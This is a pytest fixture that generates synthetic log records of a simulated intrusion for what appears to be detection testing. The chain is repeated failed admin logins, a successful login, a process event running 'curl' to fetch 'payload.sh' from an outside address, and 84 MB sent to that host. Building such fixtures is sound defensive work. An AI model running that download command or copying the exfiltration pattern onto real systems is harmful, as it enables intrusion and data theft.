from typing import Any

import pytest


@pytest.fixture
def attack_records() -> list[dict[str, Any]]:
    records: list[dict[str, Any]] = []
    for index, second in enumerate((0, 8, 16, 24, 32), start=1):
        records.append(
            {
                "id": f"evt-{index:03d}",
                "timestamp": f"2026-09-16T12:01:{second:02d}Z",
                "source": "auth",
                "action": "login_failed",
                "username": "admin",
                "source_ip": "10.2.4.18",
                "hostname": "web-01",
            }
        )
    records.extend(
        [
            {
                "id": "evt-006",
                "timestamp": "2026-09-16T12:03:00Z",
                "source": "auth",
                "action": "login_success",
                "username": "admin",
                "source_ip": "10.2.4.18",
                "hostname": "web-01",
            },
            {
                "id": "evt-007",
                "timestamp": "2026-09-16T12:04:00Z",
                "source": "process",
                "process_name": "curl",
                "command_line": "curl https://198.51.100.24/payload.sh",
                "username": "admin",
                "hostname": "web-01",
            },
            {
                "id": "evt-008",
                "timestamp": "2026-09-16T12:07:00Z",
                "source": "network",
                "source_ip": "10.0.0.5",
                "destination_ip": "198.51.100.24",
                "hostname": "web-01",
                "bytes_sent": 84 * 1024 * 1024,
                "demo_destination": True,
            },
        ]
    )
    return records

